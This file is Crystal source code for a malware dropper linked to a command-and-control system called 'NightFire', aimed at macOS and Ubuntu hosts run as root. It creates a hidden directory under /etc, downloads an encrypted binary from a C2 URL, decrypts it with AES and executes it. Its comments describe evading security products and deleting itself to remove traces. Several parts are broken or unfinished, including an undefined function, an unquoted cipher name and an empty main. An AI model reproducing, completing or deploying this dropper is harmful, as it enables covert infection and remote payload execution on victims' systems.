require "http/client"
require "io/memory"
require "file_utils"
require "secure_random"
require "openssl"

# Dropper supports macOS and Ubuntu-based Linux targets.
# We assume this will be run with root privilages to simplify things.

# Change the PLATFORM and ARCH constants to reflect the target info. PLATFORM = MACOS/UBUNTU, ARCH=32/64/ARM.
PLATFORM = "MACOS"
ARCH = "64"
# /etc is used to maintain compatability with both macOS and Linux during development. Targeted attacks should use custom infection locations.
INFECTION_ROOT = "/etc"
DIRECTORY_NAME = "." + SecureRandom.uuid()
# This should point to the binary download location.
ENCRYPTED_BINARY_URL = "http://example..com/bin/" + PLATFORM + ARCH
ENCRYPTED_BINARY_NAME = "." + SecureRandom.uuid()
DECRYPTED_BINARY_NAME = "." + SecureRandom.uuid()
# Provide the IV and Keys generated by NightFire.
DECRYPTION_IV = "IFYOUDONTCHANGETHISURGONNAHAVEABADTIME"
DECRYPTION_KEY = "IFYOUDONTCHANGETHISURGONNAHAVEABADTIME"

def generate_binary_directory()
	begin
		FileUtils.cd(INFECTION_ROOT)
		if File.exists?(DIRECTORY_NAME)
			# What a conincidence!
			# We'll just remove it then recreate it.
			FileUtils.rm_r(DIRECTORY_NAME)
			Dir.mkdir(DIRECTORY_NAME, mode = 5101)
		else
			Dir.mkdir(DIRECTORY_NAME, mode = 5101)
		end
	rescue
		# Unable to generate directories, probably do to restricted permissions. 
		# Rather than try to sidestep it, we'll throw in the towel. 
		seppuku()
	end
end

def enter_binary_directory()
	begin
		FileUtils.cd(INFECTION_ROOT)
		FileUtils.cd(DIRECTORY_NAME)
	rescue
		# Unable to enter binary directory. Permissions might have been changed by system or PSP.
		seppuku() 
	end
end

def get_binary()
	enter_infection_root()
	client_attempts = 1
	begin
		HTTP::Client.get(ENCRYPTED_BINARY_URL) do |response|
			while client_attempts <= 3
				case response.status_code
				when 200
					# OK. Fetch binary via GET.
					File.write(ENCRYPTED_BINARY_NAME, response.body_io)
					return true
				when 400
					# Connection might be tampered with (ie. transparent proxy).
					client_attempts += 1
				when 404
					# Either CnC is sunk, or BINARY_URL is misconfigured.
					client_attempts += 1
				when 500
					# Caught server during binary regeneration. 
					sleep(15)
					client_attempts += 1
				when 503
					# CnC is overwhelmed, but reachable. Sleep to prevent self-inflicted DDOS.
					sleep(900)
				else
					# Not an error we care to handle. NightFire doesn't implement any other codes.
					# If the server replies with other codes, it's either fake or the domain is wrong.
					client_attempts += 1
				end
			end
			# Reached max attempts.
			# Current domain is a no-go. Sleep until new one is generated.
			puts("UNIMPLEMENTED: SLEEP UNTIL NEXT DOMAIN GENERATION.")
		end
	rescue
		# Can't reach the server, either we're not connected to the internet or we're blocked.
		#seppuku()
	end
end

def decrypt_binary()
	# Primary reason for encryption is to prevent binary from read during transit by PSPs.
	# PSP can still read when it hits the disk though. Have a few theories as to preventing/mitigating that.
	begin
		enter_binary_directory()
		if File.file?(ENCRYPTED_BINARY_NAME)
			encrypted_binary = File.open(ENCRYPTED_BINARY_NAME, "r")
			decipher = OpenSSL::Cipher::Cipher.new(AES-128-CBC)
			decipher.decrypt
			decipher_IV = DECRYPTION_IV
			decipher.key = DECRYPTION_KEY
			decypted_binary = decipher.update(encrypted_binary) + decipher.final
			File.new(DECRYPTED_BINARY_NAME, decypted_binary)
			FileUtils.rm(ENCRYPTED_BINARY_NAME)
		else
			# PSP probably just nuked our encrypted binary. Clean up before we get completely mauled.
			seppuku()
		end
	rescue exception
		puts(exception.message)
	end	
end

def execute_payload()
	# Establish persistance and execute
	Process.new("./" + DECRYPTED_BINARY_NAME)
	# Should find way to ensure process has launched, then clean up.
end

def seppuku()
	# Delete infection root and dropper binary (self).
	FileUtils.rm_r(DIRECTORY_NAME)
	File.Utils.rm(File.real_path(PROGRAM_NAME))
end

def clean_up_dropper()
	# Job's done. Clean up traces of dropper and vanish.
	FileUtils.rm(File.real_path(PROGRAM_NAME))
end


def main()
end

main()
